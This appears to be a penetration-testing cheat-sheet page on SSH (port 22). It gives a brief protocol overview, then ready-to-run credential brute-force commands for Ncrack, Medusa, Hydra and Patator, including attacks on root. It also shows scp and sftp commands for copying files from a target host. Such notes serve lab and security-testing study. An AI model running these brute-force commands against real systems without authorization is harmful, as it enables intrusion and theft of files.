---
title: PORT 22/tcp - SSH
category: Services
order: 2
---

# Introduction

The SSH protocol works on the client/server-model. The SSH client always initiates the setup of the secure connection, and the SSH server listens for incoming connection requests (usually on TCP port 22 on the host system) and responds to them.

In the connection setup phase, the SSH server authenticates itself to the client by providing its public key. This allows the SSH client to verify that it is actually communicating with the correct SSH server (instead of an attacker that could be posing as the server).

After a successful authentication the server provides the client access to the host system. This access is governed with the user account permissions at the target host system.


# Bruteforcing Credentials

To bruteforce the login in order to find valid credentials we can use different tools:

* Ncrack
```
ncrack -U usernames.txt -P passowrds.txt ssh://10.10.10.10 -v
ncrack -u root -P passowrds.txt ssh://10.10.10.10 -v
```

* Medusa
```
medusa -h 10.10.10.10 -U usernames.txt -P passowrds.txt -M ssh
medusa -h 10.10.10.10 -u root -P passowrds.txt -M ssh
```

* Hydra
```
hydra -L usernames.txt -P passwords.txt ssh://10.10.10.10 -s 22
hydra -l root -P passwords.txt ssh://10.10.10.10 -s 22
```

* Patator
```
patator ssh_login host=10.10.10.10 user=FILE0 password=FILE1 0=users.txt  1=pass.txt -x ignore:mesg='Authentication failed'
patator ssh_login host=10.10.10.10 user=root password=FILE0 0=pass.txt -x ignore:mesg='Authentication failed'
```

# Donwload Files

To download files we can use `sftp` or `scp`:

* SFTP

Is like ftp:

```
sftp root@ip

> get file.txt
> get -r folder/
```

* SCP

```
scp root@ip:/tmp/file.txt file.txt
scp -r root@ip:/tmp/folder folder 
```